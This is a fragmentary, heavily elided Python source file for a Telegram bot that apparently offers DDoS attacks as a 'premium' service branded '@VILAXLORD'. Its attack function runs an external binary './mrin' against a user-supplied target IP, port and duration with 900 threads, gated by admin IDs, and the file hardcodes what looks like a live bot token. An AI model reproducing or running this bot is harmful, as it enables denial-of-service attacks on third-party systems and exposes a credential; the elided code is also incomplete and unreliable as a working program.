...
BOT_TOKEN = "7699923377:AAHZ6gJFBePgyFcJathOqq7SfS9xiV80fc0"
...
async def run_attack_command_async(target_ip, target_port, duration):
    ...
    process1 = await asyncio.create_subprocess_shell(f"./mrin {target_ip} {target_port} {duration} 900")    
    ...
    if user_id in ADMIN_IDS:
        ...
        if len(command) == 2:
            try:
                ...
                response = f"📵 𝙀𝙍𝙍𝙊𝙍 𝘿𝙈 📵 --> @VILAXLORD"
        else:
            response = "📵 𝙀𝙍𝙍𝙊𝙍 𝘿𝙈 📵 --> @VILAXLORD"
    else:
        response = f"📵 𝙀𝙍𝙍𝙊𝙍 𝘿𝙈 📵 --> @VILAXLORD"
...
def start_command(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "WELCOME TO 🥇PREMIUM🥇 USER--> @VILAXLORD.", reply_markup=main_menu())
